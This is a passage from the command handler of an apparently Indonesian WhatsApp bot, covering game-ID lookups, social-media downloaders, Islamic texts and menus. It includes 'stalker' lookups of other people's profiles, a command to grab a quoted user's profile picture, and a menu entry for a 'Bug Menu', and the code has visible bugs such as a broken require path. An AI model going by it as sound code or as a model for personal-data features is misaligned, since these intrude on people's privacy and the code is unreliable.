                if (!text) return m.reply(`Example : ${prefix +command} type id\n\nList Type :\n1. ff (Free Fire)\n2. ml (Mobile Legends)\n3. aov (Arena Of Valor)\n4. cod (Call Of Duty)\n5. pb (point Blank)\n6. ig (Instagram)\n7. npm (https://npmjs.com)`)
                let [type, id, zone] = args
                if (type.toLowerCase() == 'ff') {
                    if (!id) throw `No Query id, Example ${prefix + command} ff 552992060`
                    let anu = await fetchJson(api('zenz', '/api/nickff', { apikey: global.APIKeys[global.APIs['zenz']], query: id }))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`ID : ${anu.result.gameId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'ml') {
                    if (!id) throw `No Query id, Example : ${prefix + command} ml 214885010 2253`
                    if (!zone) throw `No Query id, Example : ${prefix + command} ml 214885010 2253`
                    let anu = await fetchJson(api('zenz', '/api/nickml', { apikey: global.APIKeys[global.APIs['zenz']], query: id, query2: zone }))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`ID : ${anu.result.gameId}\nZone : ${anu.result.zoneId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'aov') {
                    if (!id) throw `No Query id, Example ${prefix + command} aov 293306941441181`
                    let anu = await fetchJson(api('zenz', '/api/nickaov', { apikey: global.APIKeys[global.APIs['zenz']], query: id }))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`ID : ${anu.result.gameId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'cod') {
                    if (!id) throw `No Query id, Example ${prefix + command} cod 6290150021186841472`
                    let anu = await fetchJson(api('zenz', '/api/nickcod', { apikey: global.APIKeys[global.APIs['zenz']], query: id }))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`ID : ${anu.result.gameId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'pb') {
                    if (!id) throw `No Query id, Example ${prefix + command} pb riio46`
                    let anu = await fetchJson(api('zenz', '/api/nickpb', { apikey: global.APIKeys[global.APIs['zenz']], query: id }))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`ID : ${anu.result.gameId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'ig') {
                    if (!id) throw `No Query username, Example : ${prefix + command} ig qwerty`
                    let { result: anu } = await fetchJson(api('zenz', '/api/stalker/ig', { username: id }, 'apikey'))
                    if (anu.status == false) return m.reply(anu.result.message)
                    danta.sendMedia(m.chat, anu.caption.profile_hd, '', `⭔ Full Name : ${anu.caption.full_name}\n⭔ User Name : ${anu.caption.user_name}\n⭔ ID ${anu.caption.user_id}\n⭔ Followers : ${anu.caption.followers}\n⭔ Following : ${anu.caption.following}\n⭔ Bussines : ${anu.caption.bussines}\n⭔ Profesional : ${anu.caption.profesional}\n⭔ Verified : ${anu.caption.verified}\n⭔ Private : ${anu.caption.private}\n⭔ Bio : ${anu.caption.biography}\n⭔ Bio Url : ${anu.caption.bio_url}`, m)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'npm') {
                    if (!id) throw `No Query username, Example : ${prefix + command} npm scrape-primbon`
                    let { result: anu } = await fetchJson(api('zenz', '/api/stalker/npm', { query: id }, 'apikey'))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`⭔ Name : ${anu.name}\n⭔ Version : ${Object.keys(anu.versions)}\n⭔ Created : ${tanggal(anu.time.created)}\n⭔ Modified : ${tanggal(anu.time.modified)}\n⭔ Maintainers :\n ${anu.maintainers.map(v => `- ${v.name} : ${v.email}`).join('\n')}\n\n⭔ Description : ${anu.description}\n⭔ Homepage : ${anu.homepage}\n⭔ Keywords : ${anu.keywords}\n⭔ Author : ${anu.author.name}\n⭔ License : ${anu.license}\n⭔ Readme : ${anu.readme}`)
		    db.data.users[m.sender].limit -= 1
                } else {
                    m.reply(`Example : ${prefix +command} type id\n\nList Type :\n1. ff (Free Fire)\n2. ml (Mobile Legends)\n3. aov (Arena Of Valor)\n4. cod (Call Of Duty)\n5. pb (point Blank)\n6. ig (Instagram)\n7. npm (https://npmjs.com)`)
                }
            }
            break
            case 'tiktok': case 'tiktoknowm': {
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(`https://hadi-api.cf/api/tiktok?url=${text}`)
                let buttons = [
                    {buttonId: `allmenu`, buttonText: {displayText: '📖List Menu'}, type: 1},
                    {buttonId: `tiktokmp3 ${text}`, buttonText: {displayText: '♫ Audio'}, type: 1}
                ]
                let buttonMessage = {
                    video: { url: anu.result.video.nowm },
                    caption: `Download From ${text}`,
                    footer: nyoutube,
                    buttons: buttons,
                    headerType: 5
                }
                danta.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
           /**case 'tiktokwm': case 'tiktokwatermark': {
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(`https://botcahx-rest-api.herokuapp.com/api/dowloader/tikok?url=${text}`)
                let buttons = [
                    {buttonId: `tiktoknowm ${text}`, buttonText: {displayText: '► No Watermark'}, type: 1},
                    {buttonId: `tiktokmp3 ${text}`, buttonText: {displayText: '♫ Audio'}, type: 1}
                ]
                let buttonMessage = {
                    video: { url: anu.result.video_original },
                    caption: `Download From ${text}`,
                    footer: nyoutube,
                    buttons: buttons,
                    headerType: 5
                }
                naze.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break**/
            case 'tiktokmp3': case 'tiktokaudio': {
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(`https://hadi-api.cf/api/tiktok?url=${text}`)
                let buttons = [
                    {buttonId: `allmenu`, buttonText: {displayText: '📖List Menu'}, type: 1},
                    {buttonId: `tiktoknowm ${text}`, buttonText: {displayText: '► No Watermark'}, type: 1}
                ]
                let buttonMessage = {
                    text: `Download From ${text}`,
                    footer: nyoutube,
                    buttons: buttons,
                    headerType: 2
                }
                let msg = await danta.sendMessage(m.chat, buttonMessage, { quoted: m })
                danta.sendMessage(m.chat, { audio: { url: anu.result.audio_only.audio1 }, mimetype: 'audio/mpeg'}, { quoted: msg })
            }
            break
            case 'malingpp': {
         if (!m.quoted) return m.reply('Balas target yg ingin di maling pp nya!')
        anu = await danta.profilePictureUrl(m.quoted.sender, 'image')
        danta.sendMessage(from, { image: { url: anu, caption: 'Maling pp', quoted: troli}})
       }
break
	        case 'instagram': case 'ig': case 'igdl': {
                if (!text) throw 'No Query Url!'
                m.reply(mess.wait)
                if (/(?:\/p\/|\/reel\/|\/tv\/)([^\s&]+)/.test(isUrl(text)[0])) {
                    let anu = await fetchJson(api('zenz', '/downloader/instagram2', { url: isUrl(text)[0] }, 'apikey'))
                    for (let media of anu.data) danta.sendFileUrl(m.chat, media, `Download Url Instagram From ${isUrl(text)[0]}`, m)
                } else if (/\/stories\/([^\s&]+)/.test(isUrl(text)[0])) {
                    let anu = await fetchJson(api('zenz', '/downloader/instastory', { url: isUrl(text)[0] }, 'apikey'))
                    danta.sendFileUrl(m.chat, anu.media[0].url, `Download Url Instagram From ${isUrl(text)[0]}`, m)
                }
            }
            break
            case 'joox': case 'jooxdl': {
                if (!text) throw 'No Query Title'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/downloader/joox', { query: text }, 'apikey'))
                let msg = await danta.sendImage(m.chat, anu.result.img, `⭔ Title : ${anu.result.lagu}\n⭔ Album : ${anu.result.album}\n⭔ Singer : ${anu.result.penyanyi}\n⭔ Publish : ${anu.result.publish}\n⭔ Lirik :\n${anu.result.lirik.result}`, m)
                danta.sendMessage(m.chat, { audio: { url: anu.result.mp4aLink }, mimetype: 'audio/mpeg', fileName: anu.result.lagu+'.m4a' }, { quoted: msg })
            }
            break
            case 'soundcloud': case 'scdl': {
                if (!text) throw 'No Query Title'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/downloader/soundcloud', { url: isUrl(text)[0] }, 'apikey'))
                let msg = await danta.sendImage(m.chat, anu.result.thumb, `⭔ Title : ${anu.result.title}\n⭔ Url : ${isUrl(text)[0]}`)
                danta.sendMessage(m.chat, { audio: { url: anu.result.url }, mimetype: 'audio/mpeg', fileName: anu.result.title+'.m4a' }, { quoted: msg })
            }
            break
	        case 'twitdl': case 'twitter': {
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/api/downloader/twitter', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `twittermp3 ${text}`, buttonText: {displayText: '► Audio'}, type: 1}
                ]
                let buttonMessage = {
                    video: { url: anu.result.HD || anu.result.SD },
                    caption: util.format(anu.result),
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 5
                }
                danta.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'searchgc': {
if (args.length < 1) return m.reply(`Example :\n${prefix}searchgc Editor Berkelas`)
nae = args.join(" ")
hx.linkwa(nae).then(res => {
teks = '```「 Search Group 」```'
for (let i of res) {
teks += `\n\n╠➥> Group Whatsapp :\n`
teks += `${i.link}\n`
teks += `${i.nama}`
}
let buttons = [
{buttonId: `ping`, buttonText: {displayText: 'status'}, type: 1}
]
danta.sendMessage(m.chat, { quoted: m })
})
}
break
            case 'twittermp3': case 'twitteraudio': {
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/api/downloader/twitter', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `twitter ${text}`, buttonText: {displayText: '► Video'}, type: 1}
                ]
                let buttonMessage = {
		    image: { url: anu.result.thumb },
                    caption: util.format(anu.result),
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 4
                }
                let msg = await danta.sendMessage(m.chat, buttonMessage, { quoted: m })
                danta.sendMessage(m.chat, { audio: { url: anu.result.audio } }, { quoted: msg })
            }
            break
	        case 'fbdl': case 'fb': case 'facebook': {
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/api/downloader/facebook', { url: text }, 'apikey'))
                danta.sendMessage(m.chat, { video: { url: anu.result.url }, caption: `⭔ Title : ${anu.result.title}`}, { quoted: m })
            }
            break
	        case 'pindl': case 'pinterestdl': {
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/api/downloader/pinterestdl', { url: text }, 'apikey'))
                danta.sendMessage(m.chat, { video: { url: anu.result }, caption: `Download From ${text}` }, { quoted: m })
            }
            break
            case 'umma': case 'ummadl': {
	        if (!text) throw `Example : ${prefix + command} https://umma.id/channel/video/post/gus-arafat-sumber-kecewa-84464612933698`
                let { umma } = require('./lib) scraper')
		let anu = await umma(isUrl(text)[0])
		if (anu.type == 'video') {
		    let buttons = [
                        {buttonId: `ytmp3 ${anu.media[0]} 128kbps`, buttonText: {displayText: '♫ Audio'}, type: 1},
                        {buttonId: `ytmp4 ${anu.media[0]} 360p`, buttonText: {displayText: '► Video'}, type: 1}
                    ]
		    let buttonMessage = {
		        image: { url: anu.author.profilePic },
			caption: `
⭔ Title : ${anu.title}
⭔ Author : ${anu.author.name}
⭔ Like : ${anu.like}
⭔ Caption : ${anu.caption}
⭔ Url : ${anu.media[0]}
Untuk Download Media Silahkan Klik salah satu Button dibawah ini atau masukkan command ytmp3/ytmp4 dengan url diatas
`,
			footer: danta.user.name,
			buttons,
			headerType: 4
		    }
		    danta.sendMessage(m.chat, buttonMessage, { quoted: m })
		} else if (anu.type == 'image') {
		    anu.media.map(async (url) => {
		        danta.sendMessage(m.chat, { image: { url }, caption: `⭔ Title : ${anu.title}\n⭔ Author : ${anu.author.name}\n⭔ Like : ${anu.like}\n⭔ Caption : ${anu.caption}` }, { quoted: m })
		    })
		}
	    }
	    break
        case 'ringtone': {
		if (!text) throw `Example : ${prefix + command} black rover`
        let { ringtone } = require('./lib/scraper')
		let anu = await ringtone(text)
		let result = anu[Math.floor(Math.random() * anu.length)]
		danta.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
	    }
	    break
		case 'iqra': {
		oh = `Example : ${prefix + command} 3\n\nIQRA Yang tersedia : 1,2,3,4,5,6`
		if (!text) throw oh
		yy = await getBuffer(`https://islamic-api-indonesia.herokuapp.com/api/data/pdf/iqra${text}`)
		danta.sendMessage(m.chat, {document: yy, mimetype: 'application/pdf', fileName: `iqra${text}.pdf`}, {quoted:m}).catch ((err) => m.reply(oh))
		}
		break
		/**case 'juzamma': {
		if (args[0] === 'pdf') {
		m.reply(mess.wait)
		danta.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pdf'}, mimetype: 'application/pdf', fileName: 'juz-amma-arab-latin-indonesia.pdf'}, {quoted:m})
		} else if (args[0] === 'docx') {
		m.reply(mess.wait)
		danta.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.docx'}, mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', fileName: 'juz-amma-arab-latin-indonesia.docx'}, {quoted:m})
		} else if (args[0] === 'pptx') {
		m.reply(mess.wait)
		danta.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pptx'}, mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation', fileName: 'juz-amma-arab-latin-indonesia.pptx'}, {quoted:m})
		} else if (args[0] === 'xlsx') {
		m.reply(mess.wait)
		danta.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.xlsx'}, mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', fileName: 'juz-amma-arab-latin-indonesia.xlsx'}, {quoted:m})
		} else {
		m.reply(`Mau format apa ? Example : ${prefix + command} pdf

Format yang tersedia : pdf, docx, pptx, xlsx`)
		}
		}
		break**/
		case 'tr': {
if (!args.join(" ")) return m.reply("Text?")
tes = await fetchJson (`https://megayaa.herokuapp.com/api/translate?to=en&kata=${args.join(" ")}`)
Infoo = tes.info
Detek = tes.translate
m.reply(`🌐Translate : ${Detek}\n📘Results : ${Infoo}`)
}
break
		case 'hadis': case 'hadist': {
		if (!args[0]) throw `Contoh:
${prefix + command} bukhari 1
${prefix + command} abu-daud 1

Pilihan tersedia:
abu-daud
1 - 4590
ahmad
1 - 26363
bukhari
1 - 7008
darimi
1 - 3367
ibnu-majah
1 - 4331
nasai
1 - 5662
malik
1 - 1594
muslim
1 - 5362`
		if (!args[1]) throw `Hadis yang ke berapa?\n\ncontoh:\n${prefix + command} muslim 1`
		try {
		let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/json/hadith/${args[0]}`)
		let { number, arab, id } = res.find(v => v.number == args[1])
		m.reply(`No. ${number}

${arab}

${id}`)
		} catch (e) {
		m.reply(`Hadis tidak ditemukan !`)
		}
		}
		break
		case 'alquran': {
		if (!args[0]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`
		if (!args[1]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`
		let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
		let txt = `*Arab* : ${res.result.data.text.arab}
*English* : ${res.result.data.translation.en}
*Indonesia* : ${res.result.data.translation.id}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
		m.reply(txt)
		danta.sendMessage(m.chat, {audio: { url: res.result.data.audio.primary }, mimetype: 'audio/mpeg'}, { quoted : m })
		}
		break
		case 'tafsirsurah': {
		if (!args[0]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
		if (!args[1]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
		let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
		let txt = `「 *Tafsir Surah*  」

*Pendek* : ${res.result.data.tafsir.id.short}

*Panjang* : ${res.result.data.tafsir.id.long}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
		m.reply(txt)
		}
		break
		
		
            case 'gsmarena': {
            if (!text) throw `Example : ${prefix + command} samsung`
            let res = await fetchJson(api('zenz', '/webzone/gsmarena', { query: text }, 'apikey'))
            let { judul, rilis, thumb, ukuran, type, storage, display, inchi, pixel, videoPixel, ram, chipset, batrai, merek_batre, detail } = res.result
let capt = `⭔ Title: ${judul}
⭔ Realease: ${rilis}
⭔ Size: ${ukuran}
⭔ Type: ${type}
⭔ Storage: ${storage}
⭔ Display: ${display}
⭔ Inchi: ${inchi}
⭔ Pixel: ${pixel}
⭔ Video Pixel: ${videoPixel}
⭔ Ram: ${ram}
⭔ Chipset: ${chipset}
⭔ Battery: ${batrai}
⭔ Battery Brand: ${merek_batre}
⭔ Detail: ${detail}`
            danta.sendImage(m.chat, thumb, capt, m)
            }
            break
            case 'jadwalbioskop': {
            if (!text) throw `Example: ${prefix + command} jakarta`
            let res = await fetchJson(api('zenz', '/webzone/jadwalbioskop', { kota: text }, 'apikey'))
            let capt = `Jadwal Bioskop From : ${text}\n\n`
            for (let i of res.result){
            capt += `⭔ Title: ${i.title}\n`
            capt += `⭔ Thumbnail: ${i.thumb}\n`
            capt += `⭔ Url: ${i.url}\n\n──────────────────────\n`
            }
            danta.sendImage(m.chat, res.result[0].thumb, capt, m)
            }
            break
            case 'nowplayingbioskop': {
            let res = await fetchJson(api('zenz', '/webzone/nowplayingbioskop', {}, 'apikey'))
            let capt = `Now Playing Bioskop\n\n`
            for (let i of res.result){
            capt += `⭔ Title: ${i.title}\n`
            capt += `⭔ Url: ${i.url}\n`
            capt += `⭔ Img Url: ${i.img}\n\n──────────────────────\n`
            }
            danta.sendImage(m.chat, res.result[0].img, capt, m)
            }
            break
            case 'aminio': {
            if (!text) throw `Example: ${prefix + command} free fire`
            let res = await fetchJson(api('zenz', '/webzone/amino', { query: text }, 'apikey'))
            let capt = `Amino Search From : ${text}\n\n`
            for (let i of res.result){
            capt += `⭔ Community: ${i.community}\n`
            capt += `⭔ Community Link: ${i.community_link}\n`
            capt += `⭔ Thumbnail: ${i.community_thumb}\n`
            capt += `⭔ Description: ${i.community_desc}\n`
            capt += `⭔ Member Count: ${i.member_count}\n\n──────────────────────\n`
            }
            danta.sendImage(m.chat, 'https://'+res.result[0].community_thumb, capt, m)
            }
            break
            case 'wattpad': {
            if (!text) throw `Example : ${prefix + command} love`
            let res = await fetchJson(api('zenz', '/webzone/wattpad', { query: text }, 'apikey'))
            let { judul, dibaca, divote, bab, waktu, url, thumb, description } = res.result[0]
            let capt = `Wattpad From ${text}\n\n`
            capt += `⭔ Judul: ${judul}\n`
            capt += `⭔ Dibaca: ${dibaca}\n`
            capt += `⭔ Divote: ${divote}\n`
            capt += `⭔ Bab: ${bab}\n`
            capt += `⭔ Waktu: ${waktu}\n`
            capt += `⭔ Url: ${url}\n`
            capt += `⭔ Deskripsi: ${description}`
            danta.sendImage(m.chat, thumb, capt, m)
            }
            break
            case 'webtoons': {
            if (!text) throw `Example : ${prefix + command} love`
            let res = await fetchJson(api('zenz', '/webzone/webtoons', { query: text }, 'apikey'))
            let capt = `Webtoons Search From : ${text}\n\n`
            for (let i of res.result) {
            capt += `⭔ Judul: ${i.judul}\n`
            capt += `⭔ Like: ${i.like}\n`
            capt += `⭔ Creator: ${i.creator}\n`
            capt += `⭔ Genre: ${i.genre}\n`
            capt += `⭔ Url: ${i.url}\n\n──────────────────────\n`
            }
            m.reply(capt)
            }
            break
            case 'drakor': {
            if (!text) throw `Example : ${prefix + command} love`
            let res = await fetchJson(api('zenz', '/webzone/drakor', { query: text }, 'apikey'))
            let capt = `Drakor Search From : ${text}\n\n`
            for (let i of res.result) {
            capt += `⭔ Judul: ${i.judul}\n`
            capt += `⭔ Years: ${i.years}\n`
            capt += `⭔ Genre: ${i.genre}\n`
            capt += `⭔ Url: ${i.url}\n`
            capt += `⭔ Thumbnail Url: ${i.thumbnail}\n\n──────────────────────\n`
            }
            danta.sendImage(m.chat, res.result[0].thumbnail, capt, m)
            }
            break

//PEMBATAS=======================================
            case 'rules': {
rules = `*RULES BAGI PENGGUNA DANTA DEV BOT*

➤ Tolong Gunakan Delay Jangan Spam Saat Menggunakan Bot, Mentang Mentang Gratis Diborong semua.
➤ Call/VC Bot Auto Block.
➤ Jangan Call/VC Bot Kalau Tidak aktif.
➤ Bot tidak aktif 24 jam, jadi tergantung kalau ownernya lagi ada waktu botnya juga on.

*Konsekuensi Bila Melanggar Rules*
Bot Akan Memblokir Kamu Atau Keluar Dari Grup Yang Kamu Kelola.
━━━━━━━[ *PENTING!* ]━━━━━━━━
*➤ Kami tidak pernah meminta anda untuk* berdonasi! ingin donasi chat owner
*➤ Kami tidak menyimpan gambar, video,  audio, dan dokumen yang anda kirim*
*➤ Kami tidak akan pernah meminta anda untukmemberikan informasi pribadi*
*➤ Jika menemukan Bug/Error silahkan langsung lapor ke Owner bot*
*➤  Jika kamu menelpon bot Dan di block,Owner Tidak Bertanggung Jawab*
*➤ Apapun yang anda perintah pada bot ini , KAMI TIDAK AKAN BERTANGGUNG JAWAB*
━━━━━━━━━━━━━━━━━━━━━━━━
`
let buttons = [{ buttonId: 'allmenu', buttonText: { displayText: '📖List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '👑Sewa' }, type: 1 }]
            await danta.sendButtonText(m.chat, buttons, rules, nyoutube, m, {quoted: fkontak})
            }
            break
            case 'menu': {
            let message = await prepareWAMessageMedia({ image: fs.readFileSync('./lib/danta.jpg') }, { upload: danta.waUploadToServer })
           // let ownernya = ownernomer + '@s.whatsapp.net'
            let me = m.sender
            danta.sendMessage(m.chat, {audio: fs.readFileSync('./src/sound22.mp3'), mimetype: 'audio/mpeg', ptt:true })
            fs.readFileSync('./image/danta.jpg')
            let jawab = `*${ucapanWaktu}*
╔══✪〘 𝙄𝙉𝙁𝙊 𝙐𝙎𝙀𝙍 〙✪══
╠➥ *Nama* : ${pushname}
╠➥ *Number* : ${me.split('@')[0]}
╠➥ *Premium* : ${isPremium ? '✅' : `❌`}
╠➥ *Limit* : ${isPremium ? '♾Infinity' : `〽️${db.data.users[m.sender].limit}`}
╚═✪〘 𝐃𝐚𝐫𝐤 𝐌𝐃 〙✪══

╔╦╦╦═╦╗╔═╦═╦══╦═╗
║║║║╩╣╚╣═╣║║║║║╩╣
╚══╩═╩═╩═╩═╩╩╩╩═╝

╔══✪〘 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 〙✪══
║
╠➥ *BOT TYPE : NODEJS V18*
╠➥ *NAME : 𝐃𝐚𝐫𝐤 𝐌𝐃*
╠➥ *VERSION : 1.2*
╠➥ *SOURCE CODE : https://youtube.com/c/nazedev*
╠➥ *Github : https://github.com/nazedev*
║
╚═✪〘 𝐃𝐚𝐫𝐤 𝐌𝐃 〙✪══

╔══✪〘 𝙄𝙉𝘿𝙊𝙉𝙀𝙎𝙄𝘼𝙉 𝙏𝙄𝙈𝙀 〙✪══
╠➥ *Hari Ini* : ${hariini}
╠➥ *Wib* : ${barat} WIB
╠➥ *Wita* : ${tengah} WITA
╠➥ *Wit* : ${timur} WIT
╚═✪〘 𝐃𝐚𝐫𝐤 𝐌𝐃 〙✪══`
            let ments = [ownernya, me, ini_mark]
            let buttons = [{ buttonId: 'allmenu', buttonText: { displayText: '📖List Menu' }, type: 1 },{ buttonId: 'rules', buttonText: { displayText: '❗Rules' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '🙏Donasi' }, type: 1 }]
            await danta.sendButtonText(m.chat, buttons, jawab, nyoutube, m, {mentions: ments, quoted: fkontak})
            }
            break
            case 'simplemenu': case 'list': case 'help': {
            let ownernya = ownernomer + '@s.whatsapp.net'
            let me = m.sender
            danta.sendMessage(m.chat, {audio: fs.readFileSync('./src/sound22.mp3'), mimetype: 'audio/mpeg', ptt:true })
            let ments = [ownernya, me, ini_mark]
            let kukiw = `*${ucapanWaktu}*
╔══✪〘 𝙄𝙉𝙁𝙊 𝙐𝙎𝙀𝙍 〙✪══
╠➥ *Nama* : ${pushname}
╠➥ *Number* : ${me.split('@')[0]}
╠➥ *Premium* : ${isPremium ? '✅' : `❌`}
╠➥ *Limit* : ${isPremium ? '♾Infinity' : `〽️${db.data.users[m.sender].limit}`}
╚═✪〘 𝐃𝐚𝐫𝐤 𝐌𝐃 〙✪══

╔══✪〘 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 〙✪══
║
╠➥ *BOT TYPE : NODEJS V18*
╠➥ *NAME : 𝐃𝐚𝐫𝐤 𝐌𝐃*
╠➥ *VERSION : 1.2*
╠➥ *SOURCE CODE : https://youtube.com/c/nazedev*
╠➥ *Github : https://github.com/Nazedev*
║
╚═✪〘 𝐃𝐚𝐫𝐤 𝐌𝐃 〙✪══

╔══✪〘 𝙄𝙉𝘿𝙊𝙉𝙀𝙎𝙄𝘼𝙉 𝙏𝙄𝙈𝙀 〙✪══
╠➥ *Hari Ini* : ${hariini}
╠➥ *Wib* : ${barat} WIB
╠➥ *Wita* : ${tengah} WITA
╠➥ *Wit* : ${timur} WIT
╚═✪〘 𝐃𝐚𝐫𝐤 𝐌𝐃 〙✪══`
                let sections = [
                {
                title: "𝐂𝐇𝐀𝐍𝐆𝐄 𝐌𝐄𝐍𝐔 𝐁𝐎𝐓𝐍𝐘𝐀 𝐊𝐀𝐊",
                rows: [
                {title: "𝐆𝐫𝐨𝐮𝐩", rowId: `mgroup`, description: `𝐆𝐫𝐨𝐮𝐩 𝐌𝐞𝐧𝐮`},
                {title: "𝐖𝐞𝐛𝐳𝐨𝐧𝐞", rowId: `mwebzone`, description: `𝐖𝐞𝐛𝐳𝐨𝐧𝐞 𝐌𝐞𝐧𝐮`},
                {title: "𝐃𝐨𝐰𝐧𝐥𝐨𝐚𝐝𝐞𝐫", rowId: `mdownloader`, description: `𝐃𝐨𝐰𝐧𝐥𝐨𝐚𝐝𝐞𝐫 𝐌𝐞𝐧𝐮`},
                {title: "𝐁𝐮𝐠 𝐌𝐞𝐧𝐮", rowId: `mbugmenu`, description: `𝐁𝐮𝐠 𝐌𝐞𝐧𝐮`},
                {title: "𝐒𝐞𝐚𝐫𝐜𝐡", rowId: `msearch`, description: `𝐒𝐞𝐚𝐫𝐜𝐡 𝐌𝐞𝐧𝐮`},
                {title: "𝐑𝐚𝐧𝐝𝐨𝐦", rowId: `mrandom`, description: `𝐑𝐚𝐧𝐝𝐨𝐦 𝐌𝐞𝐧𝐮`},
                {title: "𝐓𝐞𝐱𝐭 𝐏𝐫𝐨", rowId: `mtextpro`, description: `𝐓𝐞𝐱𝐭 𝐏𝐫𝐨 𝐌𝐞𝐧𝐮`},
                {title: "𝐏𝐡𝐨𝐭𝐨 𝐎𝐱𝐲", rowId: `mphotooxy`, description: `𝐏𝐡𝐨𝐭𝐨 𝐎𝐱𝐲 𝐌𝐞𝐧𝐮`},
                {title: "𝐄𝐩𝐡𝐨𝐭𝐨", rowId: `mephoto`, description: `𝐄𝐩𝐡𝐨𝐭𝐨 𝐌𝐞𝐧𝐮`},
                {title: "𝐅𝐮𝐧", rowId: `mfun`, description: `𝐅𝐮𝐧 𝐌𝐞𝐧𝐮`},
                {title: "𝐏𝐫𝐢𝐦𝐛𝐨𝐧", rowId: `mprimbon`, description: `𝐏𝐫𝐢𝐦𝐛𝐨𝐧 𝐌𝐞𝐧𝐮`},
                {title: "𝐂𝐨𝐧𝐯𝐞𝐫𝐭", rowId: `mconvert`, description: `𝐂𝐨𝐧𝐯𝐞𝐫𝐭 𝐌𝐞𝐧𝐮`},
                {title: "𝐌𝐚𝐢𝐧", rowId: `mmain`, description: `𝐌𝐚𝐢𝐧 𝐌𝐞𝐧𝐮`},
                {title: "𝐃𝐚𝐭𝐚𝐛𝐚𝐬𝐞", rowId: `mdatabase`, description: `𝐃𝐚𝐭𝐚𝐛𝐚𝐬𝐞 𝐌𝐞𝐧𝐮`},
                {title: "𝐁𝐮𝐠𝐌𝐞𝐧𝐮", rowId: `mbugmenu`, description: `𝐁𝐮𝐠 𝐌𝐞𝐧𝐮`},
                {title: "𝐀𝐧𝐨𝐧𝐲𝐦𝐨𝐮𝐬", rowId: `manonymous`, description: `𝐀𝐧𝐨𝐧𝐲𝐦𝐨𝐮𝐬 𝐌𝐞𝐧𝐮`},
                {title: "𝐈𝐬𝐥𝐚𝐦𝐢𝐜", rowId: `mislamic`, description: `𝐈𝐬𝐥𝐚𝐦𝐢𝐜 𝐌𝐞𝐧𝐮`},
                {title: "𝑰𝒏𝒕𝒆𝒓𝒏𝒆𝒕 𝑴𝒆𝒏𝒖", rowId: `minternetmenu`, description: `𝑰𝒏𝒕𝒆𝒓𝒏𝒆𝒕 𝑴𝒆𝒏𝒖`},
                {title: "𝐕𝐨𝐢𝐜𝐞", rowId: `mvoice`, description: `𝐕𝐨𝐢𝐜𝐞 𝐌𝐞𝐧𝐮`},
